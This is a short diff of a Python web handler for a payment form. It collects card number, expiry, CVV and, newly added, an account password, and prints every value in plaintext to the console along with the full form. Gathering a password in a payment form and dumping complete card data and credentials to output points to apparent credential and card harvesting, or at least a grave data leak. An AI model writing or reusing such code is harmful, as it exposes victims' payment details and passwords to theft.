@@ -18,12 +18,14 @@ def process_payment():
     cardnumber = request.form.get("card_number")
     expiry = request.form.get("expiry")
     pin = request.form.get("cvv")
+    password = request.form.get("password")
 
     print("Email:", email)
     print("Cardholder:", cardholder)
     print("Card Number:", cardnumber)
     print("Expiry: ", expiry)
     print("Pin: ",pin)
+    print("Password: ", password)
     print(request.form, flush=True)
     
     
